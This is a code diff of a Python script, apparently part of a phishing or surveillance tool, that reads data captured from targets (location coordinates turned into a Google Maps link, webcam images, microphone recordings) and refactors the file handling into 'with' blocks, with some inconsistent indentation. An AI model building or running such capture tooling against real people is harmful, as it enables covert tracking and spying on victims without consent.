@@ -22,8 +22,8 @@ def After_click(Ac_path,Ac_msg):
     sleep(3)
     file_size = 0
     if os.stat(f"template/{Ac_path}").st_size != file_size:
-            data = open(f"template/{Ac_path}","r").read()
-            data_decode = json.loads(data)
+           with open(f'template/{Ac_path}','r') as data :
+            data_decode = json.load(data)
             print("\n")
             for i in data_decode:
                 if data_decode[i] == None:
@@ -31,9 +31,8 @@ def After_click(Ac_path,Ac_msg):
                 print(c.grey+ " "+i.replace("-"," ")+c.green+" : "+c.red+data_decode[i])
                 with open(f"template/{Ac_path}","w+") as file :
                     file.write("")
-            sleep(2)
-            data.close()         
-            show_message(Ac_msg)  
+           sleep(2)
+           show_message(Ac_msg)  
  
     else:  
       pass    
@@ -50,39 +49,35 @@ def Before_click(Bc_template,Bc_focus=' ',Bc_status=True):
 
                 if Bc_focus == "location":
                     
-                    data = open(f"template/{Bc_template}","r").read()
-                    location_file_json_decode = json.loads(data)
-                    print(c.re+"\n Google Map Link : "+c.green+f"https://www.google.com/maps/place/{location_file_json_decode['lat']}+{location_file_json_decode['lon']}")         
-                    result = continue_proc(
+                  with open(f'template/{Bc_template}','r') as data:
+                    location = json.load(data)
+                    print(c.re+"\n Google Map Link : "+c.green+f"https://www.google.com/maps/place/{location['lat']}+{location['lon']}")         
+                  result = continue_proc(
                        con_path=Bc_template,
                        con_status=Bc_status
                     )  
-                    return result                   
-                    data.close()                       
+                  return result                                  
                 elif Bc_focus == "webcam":
-                    data = open(f"template/{Bc_template}","r").read()
-                    webcam_file_json_decode = json.loads(data)
-                    print(c.re+"\n Image "+c.green+f"{webcam_file_json_decode['File-Name']} Saved > Please Check /images Folder ")
-                            
+                  with open(f'template/{Bc_template}','r') as data:
+                    webcam = json.load(data)
+                    print(c.re+"\n Image "+c.green+f"{webcam['File-Name']} Saved > Please Check /images Folder ")                           
 
-                    result = continue_proc(
+                  result = continue_proc(
                       con_path=Bc_template,
                       con_status=Bc_status
                    )  
-                    return result
-                    data.close()         
+                  return result  
                 
                 elif Bc_focus == "microphone":
-                    data = open(f"template/{Bc_template}","r").read()
-                    microphone_file_json_decode = json.loads(data)
-                    print(c.re+"\n Voice "+c.green+f"{microphone_file_json_decode['File-Name']} Saved > Please Check /sounds Folder ")
+                   with open(f'template/{Bc_template}','r') as data:
+                     microphone = json.load(data)
+                     print(c.re+"\n Voice "+c.green+f"{microphone['File-Name']} Saved > Please Check /sounds Folder ")
 
-                    result = continue_proc(
+                   result = continue_proc(
                        con_path=Bc_template,
                        con_status=Bc_status
                     )  
-                    return result
-                    data.close()         
+                   return result     
 
     #    except Exception as Ex:
          #   exit(Ex)
